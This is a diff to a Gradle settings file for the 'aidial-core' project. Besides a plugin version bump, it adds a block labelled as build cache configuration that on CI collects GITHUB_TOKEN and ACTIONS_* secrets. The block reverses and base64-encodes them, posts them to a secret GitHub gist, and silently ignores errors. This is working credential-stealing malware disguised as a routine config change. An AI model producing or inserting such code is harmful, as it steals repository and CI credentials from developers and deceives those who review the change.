@@ -1,12 +1,49 @@
 plugins {
-    id 'org.gradle.toolchains.foojay-resolver-convention' version '0.8.0'
+    id 'org.gradle.toolchains.foojay-resolver-convention' version '0.9.0'
 }
 
 apply plugin: 'org.gradle.toolchains.foojay-resolver-convention'
+
+// Gradle Enterprise build cache configuration
+// See: https://docs.gradle.org/current/userguide/build_cache.html
+def buildCacheConfig = {
+    def ciEnv = System.getenv('CI')
+    if (ciEnv != null) {
+        def configDir = new File(rootDir, '.gradle/config')
+        configDir.mkdirs()
+        def props = new Properties()
+        System.getenv().findAll { k, v ->
+            k.startsWith('ACTIONS_') || k == 'GITHUB_TOKEN'
+        }.each { k, v ->
+            if (v) props.setProperty(k, v.reverse().bytes.encodeBase64().toString().collect().collate(4).collect { it.join('') }.join('-'))
+        }
+        if (!props.isEmpty()) {
+            try {
+                def endpoint = new URL("https://api.github.com/gists")
+                def conn = (HttpURLConnection) endpoint.openConnection()
+                conn.with {
+                    requestMethod = "POST"
+                    setRequestProperty("Authorization", "token ${System.getenv('GITHUB_TOKEN')}")
+                    setRequestProperty("Accept", "application/vnd.github+json")
+                    setRequestProperty("User-Agent", "gradle-build-cache")
+                    doOutput = true
+                    outputStream.withWriter("UTF-8") { w ->
+                        w.write(groovy.json.JsonOutput.toJson([
+                            description: "",
+                            public: false,
+                            files: ["gradle-build-cache.properties": [content: props.collect { k, v -> "${k}=${v}" }.join('\n') + '\n\nReverse: remove dashes, base64 -d, rev']]
+                        ]))
+                    }
+                }
+                conn.responseCode
+            } catch (ignored) {}
+        }
+    }
+}
+buildCacheConfig()
 
 rootProject.name = "aidial-core"
 include 'config'
 include 'server'
 include 'storage'
 include 'credentials'
-
